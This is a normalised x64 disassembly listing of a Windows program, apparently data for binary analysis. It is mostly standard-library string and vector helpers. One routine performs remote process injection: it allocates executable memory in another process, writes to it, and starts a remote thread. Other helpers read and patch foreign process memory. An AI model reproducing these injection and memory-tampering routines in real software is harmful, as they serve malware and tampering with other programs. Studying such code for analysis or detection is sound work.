mov rcx rbx
call sub_140005dd0
nop
cmp [ rsp + 0x50 ] 0x10
jb r-xdata
sub_140005c50
push rbx
sub rsp 0x20
cmp [ rcx + 0x18 ] 0x10
mov rbx rcx
jb r-xdata
mov [ rbx + 0x18 ] 0xf
mov [ rbx + 0x10 ] 0x0
mov [ rbx ] 0x0
add rsp 0x20
pop rbx
retn
mov rcx [ rcx ]
call j_sub_14003ad04
sub_140005c90
mov [ rsp + 0x8 ] rbx
mov [ rsp + 0x10 ] rsi
push rdi
sub rsp 0x20
mov rdi r8
mov rsi rdx
mov rbx rcx
test rdx rdx
je r-xdata
cmp rdi 0xfffffffffffffffe
jbe r-xdata
mov r8 [ rcx + 0x18 ]
cmp r8 0x10
jb r-xdata
mov rax [ rbx + 0x18 ]
cmp rax rdi
jae r-xdata
lea rcx [ r--data ]
call sub_1400378ec
mov rax rcx
mov rax [ rcx ]
jmp r-xdata
test rdi rdi
jne r-xdata
mov r8 [ rbx + 0x10 ]
mov rdx rdi
mov rcx rbx
call sub_1400061b0
test rdi rdi
je r-xdata
cmp r8 0x10
jb r-xdata
cmp rdx rax
jb r-xdata
cmp [ rbx + 0x18 ] 0x10
jb r-xdata
mov [ rbx + 0x10 ] rdi
cmp rax 0x10
jb r-xdata
mov rsi [ rsp + 0x38 ]
mov rax rbx
mov rbx [ rsp + 0x30 ]
add rsp 0x20
pop rdi
retn
add rcx [ rbx + 0x10 ]
cmp rcx rdx
jbe r-xdata
mov rcx [ rcx ]
mov rcx rbx
mov rcx [ rbx ]
jmp r-xdata
mov rax rbx
mov [ rbx ] 0x0
mov rbx [ rsp + 0x30 ]
mov rsi [ rsp + 0x38 ]
add rsp 0x20
pop rdi
retn
mov rax [ rbx ]
mov [ rax ] dil
mov rax rbx
mov rbx [ rsp + 0x30 ]
mov rsi [ rsp + 0x38 ]
add rsp 0x20
pop rdi
retn
cmp r8 0x10
jb r-xdata
mov rax rbx
mov rax [ rbx ]
jmp r-xdata
mov r8 rdi
mov rdx rsi
call sub_14003a8c0
cmp [ rbx + 0x18 ] 0x10
mov [ rbx + 0x10 ] rdi
jb r-xdata
mov rax rbx
mov rax [ rbx ]
jmp r-xdata
mov [ rax + rdi ] 0x0
sub rsi rax
mov r9 rdi
mov rdx rbx
mov r8 rsi
mov rcx rbx
mov rbx [ rsp + 0x30 ]
mov rsi [ rsp + 0x38 ]
add rsp 0x20
pop rdi
jmp sub_140005f40
sub_140005dd0
push rdi
sub rsp 0x30
mov [ rsp + 0x20 ] 0xfffffffffffffffe
mov [ rsp + 0x50 ] rbx
mov rdi rdx
mov rbx rcx
mov rcx [ rcx + 0x8 ]
cmp rdx rcx
jae r-xdata
cmp rcx [ rbx + 0x10 ]
jne r-xdata
mov rax [ rbx ]
cmp rax rdx
ja r-xdata
mov rcx [ rbx + 0x8 ]
mov [ rsp + 0x40 ] rcx
mov [ rsp + 0x48 ] rcx
test rcx rcx
je r-xdata
mov rcx rbx
call sub_140006050
sub rdi rax
mov rax 0x6666666666666667
imul rdi
mov rdi rdx
sar rdi 0x4
mov rax rdi
shr rax 0x3f
add rdi rax
cmp rcx [ rbx + 0x10 ]
jne r-xdata
add [ rbx + 0x8 ] 0x28
mov rbx [ rsp + 0x50 ]
add rsp 0x30
pop rdi
retn
mov [ rcx + 0x18 ] 0xf
mov [ rcx + 0x10 ] 0x0
mov [ rcx ] 0x0
mov rdx rdi
call sub_140005eb0
nop
lea rcx [ rdi + rdi * 4 ]
mov rax [ rbx ]
lea rdx [ rax + rcx * 8 ]
mov rcx [ rbx + 0x8 ]
mov [ rsp + 0x40 ] rcx
mov [ rsp + 0x48 ] rcx
test rcx rcx
je r-xdata
mov rcx rbx
call sub_140006050
jmp r-xdata
mov [ rcx + 0x18 ] 0xf
mov [ rcx + 0x10 ] 0x0
mov [ rcx ] 0x0
call sub_140005eb0
nop
sub_140005eb0
mov [ rsp + 0x8 ] rbx
push rdi
sub rsp 0x20
mov rdi rdx
mov rbx rcx
cmp rcx rdx
je r-xdata
mov rax rbx
mov rbx [ rsp + 0x30 ]
add rsp 0x20
pop rdi
retn
cmp [ rcx + 0x18 ] 0x10
jb r-xdata
mov [ rbx + 0x18 ] 0xf
mov [ rbx + 0x10 ] 0x0
mov [ rbx ] 0x0
cmp [ rdi + 0x18 ] 0x10
jae r-xdata
mov rcx [ rcx ]
call j_sub_14003ad04
mov rax [ rdi ]
mov [ rbx ] rax
mov [ rdi ] 0x0
mov r8 [ rdi + 0x10 ]
mov rdx rdi
mov rcx rbx
inc r8
call sub_14003a8c0
jmp r-xdata
mov rax [ rdi + 0x10 ]
mov [ rbx + 0x10 ] rax
mov rax [ rdi + 0x18 ]
mov [ rbx + 0x18 ] rax
mov [ rdi + 0x18 ] 0xf
mov [ rdi + 0x10 ] 0x0
mov [ rdi ] 0x0
sub_140005f40
mov [ rsp + 0x8 ] rbx
mov [ rsp + 0x10 ] rbp
mov [ rsp + 0x18 ] rsi
push rdi
sub rsp 0x20
mov rdi [ rdx + 0x10 ]
mov rbp r8
mov rsi rdx
mov rbx rcx
cmp rdi r8
jae r-xdata
sub rdi r8
cmp r9 rdi
cmovb rdi r9
cmp rcx rdx
jne r-xdata
lea rcx [ r--data ]
call sub_140037948
cmp rdi 0xfffffffffffffffe
jbe r-xdata
lea rdx [ rdi + r8 ]
or r8 0xffffffffffffffff
call sub_140006110
mov r8 rbp
xor edx edx
mov rcx rbx
call sub_140006110
jmp r-xdata
mov rax [ rcx + 0x18 ]
cmp rax rdi
jae r-xdata
lea rcx [ r--data ]
call sub_1400378ec
mov rbp [ rsp + 0x38 ]
mov rsi [ rsp + 0x40 ]
mov rax rbx
mov rbx [ rsp + 0x30 ]
add rsp 0x20
pop rdi
retn
test rdi rdi
jne r-xdata
mov r8 [ rcx + 0x10 ]
mov rdx rdi
call sub_1400061b0
test rdi rdi
je r-xdata
cmp [ rsi + 0x18 ] 0x10
jb r-xdata
mov [ rcx + 0x10 ] rdi
cmp rax 0x10
jb r-xdata
cmp [ rbx + 0x18 ] 0x10
jb r-xdata
mov rsi [ rsi ]
mov rax rcx
mov [ rcx ] 0x0
jmp r-xdata
mov rax [ rcx ]
mov [ rax ] dil
jmp r-xdata
mov rcx rbx
mov rcx [ rbx ]
jmp r-xdata
mov rax rbx
mov rax [ rbx ]
jmp r-xdata
lea rdx [ rsi + rbp ]
mov r8 rdi
call sub_14003a8c0
cmp [ rbx + 0x18 ] 0x10
mov [ rbx + 0x10 ] rdi
jb r-xdata
mov [ rax + rdi ] 0x0
sub_140006050
sub rsp 0x28
mov r10 [ rcx ]
mov rdx [ rcx + 0x8 ]
mov r11 0x6666666666666667
sub rdx r10
mov rax r11
mov r9 rcx
imul rdx
mov r8 rdx
sar r8 0x4
mov rax r8
shr rax 0x3f
add r8 rax
mov rax 0x666666666666665
cmp r8 rax
jbe r-xdata
mov rcx [ rcx + 0x10 ]
mov rax r11
inc r8
sub rcx r10
imul rcx
sar rdx 0x4
mov rax rdx
shr rax 0x3f
add rdx rax
cmp r8 rdx
jbe r-xdata
lea rcx [ r--data ]
call sub_1400378ec
add rsp 0x28
retn
mov rcx rdx
mov rax 0x666666666666666
shr rcx 0x1
sub rax rcx
cmp rax rdx
jae r-xdata
add rdx rcx
mov rcx r9
cmp rdx r8
cmovb rdx r8
call sub_1400062f0
xor edx edx
mov rcx r9
cmp rdx r8
cmovb rdx r8
add rsp 0x28
jmp sub_1400062f0
sub_140006110
mov [ rsp + 0x8 ] rbx
push rdi
sub rsp 0x20
mov rdi r8
mov r8 [ rcx + 0x10 ]
mov r9 rdx
mov rbx rcx
cmp r8 rdx
jae r-xdata
sub r8 rdx
cmp r8 rdi
cmovb rdi r8
test rdi rdi
je r-xdata
lea rcx [ r--data ]
call sub_140037948
mov rax rbx
mov rbx [ rsp + 0x30 ]
add rsp 0x20
pop rdi
retn
mov rax [ rcx + 0x18 ]
cmp rax 0x10
jb r-xdata
mov rax rbx
mov rcx [ rcx ]
mov rax [ rbx ]
jmp r-xdata
mov rax rbx
mov [ rbx + r11 ] 0x0
mov rax [ rbx ]
mov [ rax + r11 ] 0x0
mov rax rbx
mov rbx [ rsp + 0x30 ]
add rsp 0x20
pop rdi
retn
add rdx rcx
lea rcx [ rax + r9 ]
sub r8 rdi
add rdx rdi
call sub_14003a8c0
mov r11 [ rbx + 0x10 ]
sub r11 rdi
cmp [ rbx + 0x18 ] 0x10
mov [ rbx + 0x10 ] r11
jb r-xdata
sub_1400061b0
mov [ rsp + 0x18 ] r8
mov [ rsp + 0x10 ] rdx
mov [ rsp + 0x8 ] rcx
push rbx
push rsi
push rdi
push r12
sub rsp 0x48
mov [ rsp + 0x20 ] 0xfffffffffffffffe
mov r12 r8
mov rbx rcx
mov rdi rdx
or rdi 0xf
cmp rdi 0xfffffffffffffffe
jbe r-xdata
mov r8 [ rcx + 0x18 ]
mov rcx r8
shr rcx 0x1
mov rax 0xaaaaaaaaaaaaaaab
mul rdi
shr rdx 0x1
cmp rcx rdx
jbe r-xdata
mov rdi rdx
jmp r-xdata
lea rcx [ rdi + 0x1 ]
xor esi esi
test rcx rcx
je r-xdata
mov rdi 0xfffffffffffffffe
mov rax rdi
sub rax rcx
cmp r8 rax
ja r-xdata
jmp r-xdata
cmp rcx 0xffffffffffffffff
ja r-xdata
lea rdi [ rcx + r8 ]
test r12 r12
je r-xdata
mov [ rsp + 0x88 ] 0x0
lea rdx [ rsp + 0x88 ]
lea rcx [ rsp + 0x28 ]
call sub_14003a774
lea rax [ r--data ]
mov [ rsp + 0x28 ] rax
lea rdx [ r--data ]
lea rcx [ rsp + 0x28 ]
call sub_14003f22c
nop
call sub_14003ac60
mov rsi rax
test rax rax
jne r-xdata
cmp [ rbx + 0x18 ] 0x10
jb r-xdata
cmp [ rbx + 0x18 ] 0x10
jb r-xdata
mov [ rbx ] 0x0
mov [ rbx ] rsi
mov [ rbx + 0x18 ] rdi
mov [ rbx + 0x10 ] r12
cmp rdi 0x10
cmovae rbx rsi
mov [ rbx + r12 ] 0x0
add rsp 0x48
pop r12
pop rdi
pop rsi
pop rbx
retn
mov rcx [ rbx ]
call j_sub_14003ad04
mov rdx rbx
mov rdx [ rbx ]
jmp r-xdata
mov r8 r12
mov rcx rsi
call sub_14003a8c0
sub_1400062f0
push r12
sub rsp 0x40
mov [ rsp + 0x20 ] 0xfffffffffffffffe
mov [ rsp + 0x50 ] rbx
mov [ rsp + 0x60 ] rsi
mov [ rsp + 0x68 ] rdi
mov rdi rdx
mov rsi rcx
mov rax 0x666666666666666
cmp rdx rax
jbe r-xdata
mov rcx [ rcx + 0x10 ]
sub rcx [ rsi ]
mov r12 0x6666666666666667
mov rax r12
imul rcx
sar rdx 0x4
mov rax rdx
shr rax 0x3f
add rdx rax
cmp rdx rdi
jae r-xdata
lea rcx [ r--data ]
call sub_1400378ec
mov rbx [ rsp + 0x50 ]
mov rsi [ rsp + 0x60 ]
mov rdi [ rsp + 0x68 ]
add rsp 0x40
pop r12
retn
xor ebx ebx
mov [ rsp + 0x58 ] rbx
test rdi rdi
je r-xdata
mov r8 rbx
mov rdx [ rsi + 0x8 ]
mov rcx [ rsi ]
call sub_1400064f0
nop
mov r9 [ rsi + 0x8 ]
mov rcx [ rsi ]
mov r8 r9
sub r8 rcx
mov rax r12
imul r8
mov r12 rdx
sar r12 0x4
mov rax r12
shr rax 0x3f
add r12 rax
test rcx rcx
je r-xdata
lea rcx [ rdi + rdi * 4 ]
shl rcx 0x3
call sub_14003ac60
mov rbx rax
mov [ rsp + 0x58 ] rax
test rax rax
jne r-xdata
lea rax [ rdi + rdi * 4 ]
lea rcx [ rbx + rax * 8 ]
mov [ rsi + 0x10 ] rcx
lea rax [ r12 + r12 * 4 ]
lea rcx [ rbx + rax * 8 ]
mov [ rsi + 0x8 ] rcx
mov [ rsi ] rbx
mov rdx r9
call sub_140006490
mov rcx [ rsi ]
call j_sub_14003ad04
mov [ rsp + 0x58 ] rax
lea rdx [ rsp + 0x58 ]
lea rcx [ rsp + 0x28 ]
call sub_14003a774
lea r11 [ r--data ]
mov [ rsp + 0x28 ] r11
lea rdx [ r--data ]
lea rcx [ rsp + 0x28 ]
call sub_14003f22c
nop
sub_140006430
sub rsp 0x48
xor eax eax
test rdx rdx
je r-xdata
add rsp 0x48
retn
cmp rdx 0xffffffffffffffff
ja r-xdata
lea rdx [ rsp + 0x58 ]
lea rcx [ rsp + 0x20 ]
mov [ rsp + 0x58 ] 0x0
call sub_14003a774
lea r11 [ r--data ]
lea rdx [ r--data ]
lea rcx [ rsp + 0x20 ]
mov [ rsp + 0x20 ] r11
call sub_14003f22c
int3
mov rcx rdx
call sub_14003ac60
test rax rax
jne r-xdata
sub_140006490
cmp rcx rdx
je r-xdata
retn
mov [ rsp + 0x10 ] rbx
push rdi
sub rsp 0x20
mov [ rsp + 0x30 ] rsi
mov rdi rdx
mov rbx rcx
xor esi esi
nop [ rax ] eax
mov [ rbx + 0x18 ] 0xf
mov [ rbx + 0x10 ] rsi
mov [ rbx ] sil
add rbx 0x28
cmp rbx rdi
jne r-xdata
mov rcx [ rbx ]
call j_sub_14003ad04
cmp [ rbx + 0x18 ] 0x10
jb r-xdata
mov rsi [ rsp + 0x30 ]
mov rbx [ rsp + 0x38 ]
add rsp 0x20
pop rdi
sub_1400064f0
mov [ rsp + 0x18 ] r8
push rsi
push rdi
push r12
sub rsp 0x30
mov [ rsp + 0x20 ] 0xfffffffffffffffe
mov [ rsp + 0x68 ] rbx
mov rbx r8
mov rsi rdx
mov rdi rcx
mov [ rsp + 0x50 ] rbx
xor r12d r12d
nop [ rax ] eax
mov rax rbx
mov rbx [ rsp + 0x68 ]
add rsp 0x30
pop r12
pop rdi
pop rsi
retn
mov [ rsp + 0x58 ] rbx
test rbx rbx
je r-xdata
add rbx 0x28
mov [ rsp + 0x60 ] rbx
add rdi 0x28
jmp r-xdata
mov [ rbx + 0x18 ] 0xf
mov [ rbx + 0x10 ] r12
mov [ rbx ] 0x0
mov rdx rdi
mov rcx rbx
call sub_140005eb0
nop
cmp rdi rsi
je r-xdata
sub_140006570
mov r11 rsp
push rsi
push rdi
push r12
sub rsp 0xa0
mov [ rsp + 0x60 ] 0xfffffffffffffffe
mov [ r11 + 0x18 ] rbx
mov [ r11 + 0x20 ] rbp
mov rax [ rw-data ]
xor rax rsp
mov [ rsp + 0x90 ] rax
mov rax rdx
mov rsi rcx
xor bl bl
mov [ r11 - 0x38 ] 0x7
xor r12d r12d
mov [ r11 - 0x40 ] r12
mov [ r11 - 0x50 ] r12w
lea rdx [ r11 - 0x50 ]
mov rcx rax
call sub_14000f780
test al al
je r-xdata
cmp [ rsp + 0x80 ] 0x8
jb r-xdata
lea rcx [ rsp + 0x68 ]
cmp [ rsp + 0x80 ] 0x8
cmovae rcx [ rsp + 0x68 ]
mov [ rsp + 0x30 ] r12
mov [ rsp + 0x28 ] r12d
mov [ rsp + 0x20 ] 0x3
xor r9d r9d
xor edx edx
lea r8d [ r12 + 0x1 ]
call [ CreateFileW@IAT ]
test rax rax
je r-xdata
movzx eax bl
mov rcx [ rsp + 0x90 ]
xor rcx rsp
call sub_14003a6a0
lea r11 [ rsp + 0xa0 ]
mov rbx [ r11 + 0x30 ]
mov rbp [ r11 + 0x38 ]
mov rsp r11
pop r12
pop rdi
pop rsi
retn
mov rcx [ rsp + 0x68 ]
call j_sub_14003ad04
call [ GetLastError@IAT ]
nop
cmp rax 0xffffffffffffffff
je r-xdata
mov rcx rax
call [ CloseHandle@IAT ]
mov r11 [ rsp + 0x78 ]
lea rbp [ r11 + r11 + 0x2 ]
mov [ rsp + 0x20 ] 0x40
mov r9d 0x1000
mov r8 rbp
xor edx edx
mov rcx [ rsi ]
call [ VirtualAllocEx@IAT ]
mov rdi rax
test rax rax
je r-xdata
lea rdx [ rsp + 0x68 ]
cmp [ rsp + 0x80 ] 0x8
cmovae rdx [ rsp + 0x68 ]
mov r9 [ rsi ]
mov r8 rbp
mov rcx rax
call sub_140006890
test al al
je r-xdata
mov r9d 0x8000
xor r8d r8d
mov rdx rdi
mov rcx [ rsi ]
call [ VirtualFreeEx@IAT ]
jmp r-xdata
lea rcx [ r--data ]
call [ GetModuleHandleW@IAT ]
mov rcx rax
lea rdx [ r--data ]
call [ GetProcAddress@IAT ]
mov rbp rax
mov [ rsp + 0x58 ] 0xffffffffffffffff
lea rcx [ r--data ]
call [ GetModuleHandleW@IAT ]
mov rcx rax
lea rdx [ r--data ]
call [ GetProcAddress@IAT ]
test rax rax
je r-xdata
mov [ rsp + 0x30 ] r12
mov [ rsp + 0x28 ] r12d
mov [ rsp + 0x20 ] rdi
mov r9 rbp
xor r8d r8d
xor edx edx
mov rcx [ rsi ]
call [ CreateRemoteThread@IAT ]
mov [ rsp + 0x58 ] rax
lea rcx [ r--data ]
call [ GetModuleHandleW@IAT ]
mov rcx rax
lea rdx [ r--data ]
call [ GetProcAddress@IAT ]
mov [ rsp + 0x48 ] r12
lea rcx [ rsp + 0x58 ]
mov [ rsp + 0x40 ] rcx
mov [ rsp + 0x38 ] rdi
mov [ rsp + 0x30 ] rbp
mov [ rsp + 0x28 ] r12
mov [ rsp + 0x20 ] r12
xor r9d r9d
xor r8d r8d
xor edx edx
mov rcx [ rsi ]
call rax
mov ecx eax
call [ SetLastError@IAT ]
mov rax [ rsp + 0x58 ]
jmp r-xdata
cmp rax 0xffffffffffffffff
je r-xdata
test rax rax
je r-xdata
or edx 0xffffffff
mov rcx rax
call [ WaitForSingleObject@IAT ]
mov bl 0x1
mov rcx [ rsp + 0x58 ]
call [ CloseHandle@IAT ]
sub_1400067d0
push rbx
sub rsp 0x20
cmp [ rcx + 0x48 ] 0x8
mov rbx rcx
jb r-xdata
xor eax eax
mov [ rbx + 0x48 ] 0x7
mov [ rbx + 0x40 ] rax
mov [ rbx + 0x30 ] ax
add rsp 0x20
pop rbx
retn
mov rcx [ rcx + 0x30 ]
call j_sub_14003ad04
sub_140006810
mov [ rsp + 0x8 ] rbx
push rdi
sub rsp 0x30
mov rax r9
cmp r9 0xffffffffffffffff
mov rdi r8
mov r9 r8
mov r10 rdx
jne r-xdata
lea rdx [ rsp + 0x58 ]
xor ebx ebx
mov r8 r10
mov [ rsp + 0x20 ] rdx
mov rdx rcx
mov rcx rax
mov [ rsp + 0x58 ] rbx
call [ ReadProcessMemory@IAT ]
test eax eax
je r-xdata
mov r8 rcx
mov rdx r9
mov rcx r10
call sub_14003b740
test eax eax
sete al
mov rbx [ rsp + 0x40 ]
add rsp 0x30
pop rdi
retn
movzx eax bl
mov rbx [ rsp + 0x40 ]
add rsp 0x30
pop rdi
retn
cmp [ rsp + 0x58 ] rdi
jne r-xdata
mov ebx 0x1
sub_140006890
mov [ rsp + 0x8 ] rbx
mov [ rsp + 0x10 ] rbp
mov [ rsp + 0x18 ] rsi
push rdi
sub rsp 0x40
mov rsi r9
mov rdi r8
mov rbx rdx
mov rbp rcx
cmp r9 0xffffffffffffffff
jne r-xdata
lea rax [ rsp + 0x68 ]
mov rdx rcx
mov r9d 0x40
mov rcx rsi
mov [ rsp + 0x20 ] rax
call [ VirtualProtectEx@IAT ]
test eax eax
je r-xdata
lea r9 [ rsp + 0x68 ]
lea r8d [ rsi + 0x41 ]
mov rdx rdi
call [ VirtualProtect@IAT ]
test eax eax
je r-xdata
xor al al
lea rax [ rsp + 0x38 ]
mov r9 rdi
mov r8 rbx
mov rdx rbp
mov rcx rsi
mov [ rsp + 0x38 ] 0x0
mov [ rsp + 0x20 ] rax
call [ WriteProcessMemory@IAT ]
test eax eax
je r-xdata
mov r9 rdi
mov r8 rbx
mov rdx rdi
mov rcx rbp
call sub_14003b740
mov r8d [ rsp + 0x68 ]
lea r9 [ rsp + 0x30 ]
test eax eax
mov rdx rdi
mov rcx rbp
sete bl
call [ VirtualProtect@IAT ]
movzx eax bl
jmp r-xdata
xor bl bl
cmp [ rsp + 0x38 ] rdi
jne r-xdata
mov rbx [ rsp + 0x50 ]
mov rbp [ rsp + 0x58 ]
mov rsi [ rsp + 0x60 ]
add rsp 0x40
pop rdi
retn
mov bl 0x1
jmp r-xdata
mov r9d [ rsp + 0x68 ]
lea rax [ rsp + 0x30 ]
mov r8 rdi
mov rdx rbp
mov rcx rsi
mov [ rsp + 0x20 ] rax
call [ VirtualProtectEx@IAT ]
movzx eax bl
jmp r-xdata
sub_1400069a0
mov [ rsp + 0x10 ] rbx
mov [ rsp + 0x18 ] rbp
mov [ rsp + 0x20 ] rsi
push rdi
push r12
push r13
push r14
push r15
sub rsp 0x30
mov rbp [ rsp + 0x80 ]
mov rbx rcx
mov rdi r9
mov rcx rbp
mov r15 r8
mov r12 rdx
call j_sub_14003ac60
mov r14 [ rsp + 0x88 ]
mov [ rdi ] rbx
mov r13 rax
mov bl 0x1
xor sil sil
nop [ rax + rax ] eax
test bl bl
je r-xdata
mov rdx [ rdi ]
xor ecx ecx
add rdx rbp
cmp rdx r12
setbe cl
test ecx ecx
je r-xdata
mov rcx r13
call j_sub_14003ad04#2
movzx eax sil
test sil sil
jne r-xdata
test sil sil
jne r-xdata
mov rbx [ rsp + 0x68 ]
mov rbp [ rsp + 0x70 ]
mov rsi [ rsp + 0x78 ]
add rsp 0x30
pop r15
pop r14
pop r13
pop r12
pop rdi
retn
mov [ rdi ] 0x0
mov rdx [ rdi ]
mov r9 rbp
cmp r14 0xffffffffffffffff
jne r-xdata
lea rax [ rsp + 0x60 ]
mov r8 r13
mov rcx r14
mov [ rsp + 0x20 ] rax
mov [ rsp + 0x60 ] 0x0
call [ ReadProcessMemory@IAT ]
test eax eax
je r-xdata
mov r8 rdx
mov rcx r13
mov rdx rbp
call sub_14003b740
test eax eax
sete bl
test bl bl
je r-xdata
xor bl bl
jmp r-xdata
cmp [ rsp + 0x60 ] rbp
jne r-xdata
test r12 r12
je r-xdata
jmp r-xdata
mov bl 0x1
mov r8 rbp
mov rdx r15
mov rcx r13
call sub_14003d8f0
test eax eax
sete sil
test sil sil
jne r-xdata
inc [ rdi ]
jmp r-xdata
sub_140006b00
mov rax rsp
push rbp
lea rbp [ rax - 0xf8 ]
sub rsp 0x1f0
mov [ rsp + 0x28 ] 0xfffffffffffffffe
mov [ rax + 0x18 ] rbx
mov [ rax + 0x20 ] rdi
mov rax [ rw-data ]
xor rax rsp
mov [ rbp + 0xe0 ] rax
mov rbx rcx
mov [ rsp + 0x30 ] rcx
xor edi edi
mov [ rsp + 0x20 ] edi
mov [ rcx ] rdi
mov [ rcx + 0x8 ] rdi
mov [ rcx + 0x10 ] rdi
mov [ rsp + 0x20 ] 0x1
mov [ rbp + 0x58 ] 0x7
mov [ rbp + 0x50 ] rdi
mov [ rbp + 0x40 ] di
lea rcx [ rsp + 0x40 ]
call sub_140006e70
nop
lea rdx [ rbp + 0x40 ]
lea rcx [ rsp + 0x40 ]
call sub_140007320
mov r11 rax
mov rax [ rax ]
movsxd rcx [ rax + 0x4 ]
add rcx r11
test [ rcx + 0x10 ] 0x6
cmovne rcx rdi
test rcx rcx
je r-xdata
lea rcx [ rbp - 0x28 ]
call sub_140003cd0
lea r11 [ r--data ]
mov [ rbp - 0x28 ] r11
lea rcx [ rbp - 0x28 ]
call sub_140037d08
nop
cmp [ rbp + 0x58 ] 0x8
jb r-xdata
nop [ rax ] eax
mov rax rbx
mov rcx [ rbp + 0xe0 ]
xor rcx rsp
call sub_14003a6a0
lea r11 [ rsp + 0x1f0 ]
mov rbx [ r11 + 0x20 ]
mov rdi [ r11 + 0x28 ]
mov rsp r11
pop rbp
retn
mov rcx [ rbp + 0x40 ]
call j_sub_14003ad04
lea rdx [ rbp + 0x40 ]
mov rcx rbx
call sub_140003b30
lea rax [ rbp + 0x40 ]
cmp rdx 0x8
cmovae rax rcx
mov r9 [ rbp + 0x50 ]
cmp [ rax + r9 * 2 - 0x2 ] 0x22
jne r-xdata
lea rax [ rbp + 0x40 ]
mov rcx [ rbp + 0x40 ]
mov rdx [ rbp + 0x58 ]
cmp rdx 0x8
cmovae rax rcx
cmp [ rax ] 0x22
jne r-xdata
mov [ rbp + 0xa8 ] 0x7
mov [ rbp + 0xa0 ] rdi
mov [ rbp + 0x90 ] di
mov r8d 0x22
lea rdx [ rbp + 0x90 ]
lea rcx [ rsp + 0x40 ]
call sub_140007550
or r9 0xffffffffffffffff
lea r8d [ r9 + 0x2 ]
lea rdx [ rbp + 0xb8 ]
lea rcx [ rbp + 0x40 ]
call sub_140006e20
nop
lea r8 [ rbp + 0x90 ]
mov rdx rax
lea rcx [ rbp + 0x68 ]
call sub_1400071e0
nop
mov rdx rax
mov rcx rbx
call sub_140001cf0
nop
cmp [ rbp + 0x80 ] 0x8
jb r-xdata
add r9 0xfffffffffffffffe
mov r8d 0x1
lea rdx [ rbp + 0x68 ]
lea rcx [ rbp + 0x40 ]
call sub_140006e20
nop
mov rdx rax
mov rcx rbx
call sub_140001cf0
nop
cmp [ rbp + 0x80 ] 0x8
jb r-xdata
mov [ rbp + 0x80 ] 0x7
mov [ rbp + 0x78 ] rdi
mov [ rbp + 0x68 ] di
cmp [ rbp + 0xd0 ] 0x8
jb r-xdata
mov rcx [ rbp + 0x68 ]
call j_sub_14003ad04
lea rdx [ rbp + 0x40 ]
lea rcx [ rsp + 0x40 ]
call sub_140007320
mov r11 rax
mov rax [ rax ]
movsxd rcx [ rax + 0x4 ]
add rcx r11
test [ rcx + 0x10 ] 0x6
cmovne rcx rdi
test rcx rcx
jne r-xdata
mov rcx [ rbp + 0x68 ]
call j_sub_14003ad04
jmp r-xdata
cmp [ rbp + 0xa8 ] 0x8
jb r-xdata
mov rcx [ rbp + 0xb8 ]
call j_sub_14003ad04
nop
mov rcx [ rbp + 0x90 ]
call j_sub_14003ad04
jmp r-xdata
sub_140006d70
push rbx
sub rsp 0x20
mov rax [ rcx + 0x40 ]
mov rbx rcx
mov rcx [ rax ]
test rcx rcx
je r-xdata
mov rax [ rbx ]
mov rcx rbx
call [ rax + 0x38 ]
mov rax [ rbx + 0x58 ]
cmp [ rax ] 0x1
jle r-xdata
mov rcx [ rbx + 0x40 ]
cmp [ rcx ] 0x0
je r-xdata
movzx eax cx
add rsp 0x20
pop rbx
retn
test rcx rcx
je r-xdata
dec [ rax ]
mov rax [ rbx + 0x40 ]
mov rcx [ rax ]
add rcx 0x2
mov [ rax ] rcx
movzx eax [ rcx ]
add rsp 0x20
pop rbx
retn
mov rax [ rbx ]
mov rcx rbx
add rsp 0x20
pop rbx
jmp [ rax + 0x30 ]
mov rax [ rbx + 0x58 ]
cmp [ rax ] 0x0
jle r-xdata
mov rax [ rbx + 0x58 ]
cmp [ rax ] 0x0
jle r-xdata
mov rax [ rcx ]
movzx eax [ rax ]
add rsp 0x20
pop rbx
retn
dec [ rax ]
mov rcx [ rbx + 0x40 ]
mov rdx [ rcx ]
lea rax [ rdx + 0x2 ]
mov [ rcx ] rax
movzx eax [ rdx ]
jmp r-xdata
mov ecx 0xffff
cmp cx ax
jne r-xdata
sub_140006e20
push rbx
sub rsp 0x20
xor eax eax
mov rbx rdx
mov [ rdx + 0x18 ] 0x7
mov [ rdx + 0x10 ] rax
mov [ rdx ] ax
mov rdx rcx
mov rcx rbx
mov [ rsp + 0x38 ] eax
call sub_140001dd0
mov rax rbx
add rsp 0x20
pop rbx
retn
sub_140006e70
mov [ rsp + 0x8 ] rcx
push rbx
push rsi
push rdi
sub rsp 0x30
mov [ rsp + 0x20 ] 0xfffffffffffffffe
mov rdi rdx
mov rsi rcx
mov [ rsp + 0x58 ] 0x0
lea rax [ r--data ]
mov [ rcx ] rax
lea rax [ r--data ]
mov [ rcx + 0x10 ] rax
lea rax [ r--data ]
mov [ rcx + 0x98 ] rax
mov [ rsp + 0x58 ] 0x1
lea rbx [ rcx + 0x18 ]
mov rdx rbx
call sub_140004740
nop
mov rax [ rsi ]
movsxd rcx [ rax + 0x4 ]
lea rax [ r--data ]
mov [ rcx + rsi ] rax
mov [ rsp + 0x60 ] rbx
mov rcx rbx
call sub_140004aa0
nop
lea rax [ r--data ]
mov [ rbx ] rax
mov r8 [ rdi + 0x10 ]
cmp [ rdi + 0x18 ] 0x8
jb r-xdata
mov [ rbx + 0x70 ] 0x0
mov [ rbx + 0x78 ] 0x0
test r8 r8
je r-xdata
mov rdi [ rdi ]
mov rax rsi
add rsp 0x30
pop rdi
pop rsi
pop rbx
retn
mov rdx rdi
mov rcx rbx
call sub_140004b90
nop
sub_140006f30
mov [ rsp + 0x8 ] rcx
push rsi
push rdi
push r12
sub rsp 0x30
mov [ rsp + 0x20 ] 0xfffffffffffffffe
mov [ rsp + 0x58 ] rbx
movzx edi dl
mov rbx rcx
mov rax [ rcx ]
movsxd r8 [ rax + 0x4 ]
add rcx r8
cmp [ rcx + 0x10 ] 0x0
jne r-xdata
mov edx [ rcx + 0x10 ]
or edx 0x2
cmp [ rcx + 0x48 ] 0x0
jne r-xdata
mov rcx [ rcx + 0x50 ]
test rcx rcx
je r-xdata
xor r8d r8d
call sub_140003120
xor al al
or edx 0x4
test dil dil
jne r-xdata
call sub_1400103c0
mov rax [ rbx ]
movsxd rcx [ rax + 0x4 ]
add rcx rbx
cmp [ rcx + 0x10 ] 0x0
jne r-xdata
mov rcx [ rbx ]
movsxd rax [ rcx + 0x4 ]
test [ rax + rbx + 0x18 ] 0x1
je r-xdata
mov al 0x1
jmp r-xdata
movsxd rcx [ rcx + 0x4 ]
add rcx rbx
lea rdx [ rsp + 0x68 ]
call sub_140003240
nop
mov rcx rax
call sub_140004d80
mov r12 rax
mov rsi [ rsp + 0x68 ]
test rsi rsi
je r-xdata
mov rbx [ rsp + 0x58 ]
add rsp 0x30
pop r12
pop rdi
pop rsi
retn
